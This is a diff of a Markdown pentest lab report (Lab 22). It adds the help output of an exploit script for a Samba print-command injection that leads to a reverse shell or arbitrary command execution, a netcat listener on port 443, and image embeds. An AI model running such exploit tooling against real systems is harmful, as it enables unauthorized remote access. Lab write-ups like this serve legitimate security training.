@@ -2,7 +2,7 @@
 publish: true
 title: 모의해킹 보고서 – Lab 22
 created: 2026-11-20T00:02:44.797Z
-modified: 2026-11-20T01:41:19.772Z
+modified: 2026-11-20T01:42:41.412Z
 tags:
   - pentest
   - linux
@@ -298,10 +298,31 @@ def reverse_shell(lhost, lport):
             % (lhost, lport)).encode()
 ```
 
-```
-```
+![[Template/Image/Pasted image 20261120104209.png]]
 
 ```
+└─$ python3 exploit.py -h
+usage: exploit.py [-h] [-P PRINTER] [-c CMD] rhost lhost lport
+
+CVE-2026-4480 Samba print %J injection -> reverse shell
+
+positional arguments:
+  rhost                 target Samba host/IP
+  lhost                 your listener IP (e.g. tun0)
+  lport                 your listener port
+
+options:
+  -h, --help            show this help message and exit
+  -P, --printer PRINTER
+                        guest printer share name (default: HP-Reception)
+  -c, --cmd CMD         run this shell command instead of a reverse shell (LHOST/LPORT ignored)
+```
+
+![[Template/Image/Pasted image 20261120104233.png]]
+
+```
+└─$ nc -lvnp 443
+listening on [any] 443 ...
 ```
 
 ```
